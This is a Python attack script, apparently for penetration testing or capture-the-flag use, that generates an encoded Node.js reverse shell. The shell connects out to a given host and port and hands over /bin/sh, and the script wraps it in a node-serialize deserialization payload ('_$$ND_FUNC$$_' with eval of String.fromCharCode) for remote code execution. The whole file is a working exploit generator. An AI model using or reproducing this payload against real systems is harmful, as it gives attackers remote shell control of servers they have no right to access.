#!/usr/bin/env python3

import sys, signal, time

from pwn import *

# CTRL + C

def signal_handler(sig, frame):
    print('\n\n[~] Exiting...\n')
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def encodechars(string):
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

def main(ip_addr, port):

    print("\n[+] Node.js Reverse Shell Generator\n")

    print("[+] Ip Address -> %s" % (ip_addr))
    print("[+] Port -> %s\n" % (port))

    p1 = log.progress("Reverse Shell")
    p1.status("Generating Reverse Shell")
    time.sleep(3)

    reverse_shell = '''
    var net = require('net');
    var spawn = require('child_process').spawn;
    HOST="%s";
    PORT="%s";
    TIMEOUT="5000";
    if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
    function c(HOST,PORT) {
        var client = new net.Socket();
        client.connect(PORT, HOST, function() {
            var sh = spawn('/bin/sh',[]);
            client.write("[+] You are connected\\n");
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            sh.on('exit',function(code,signal){
              client.end("[-] Disconnected!\\n");
            });
        });
        client.on('error', function(e) {
            setTimeout(c(HOST,PORT), TIMEOUT);
        });
    }
    c(HOST,PORT);
    ''' % (ip_addr, port)

    PAYLOAD = encodechars(reverse_shell)

    p1.status("Encoding Reverse Shell")
    time.sleep(3)

    #print("\n[+] Payload encoded:\neval(String.fromCharCode(%s))" % (PAYLOAD))

    print("{\"rce\":\"_$$ND_FUNC$$_function(){eval(String.fromCharCode(%s))}()\"}" % (PAYLOAD))

if __name__ == '__main__':

    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} [LHOST] [LPORT]\n\te.g. python3 {sys.argv[0]} 127.0.0.1 4444")
        sys.exit(1)

    ip_addr = sys.argv[1]
    port = sys.argv[2]

    main(ip_addr, port)
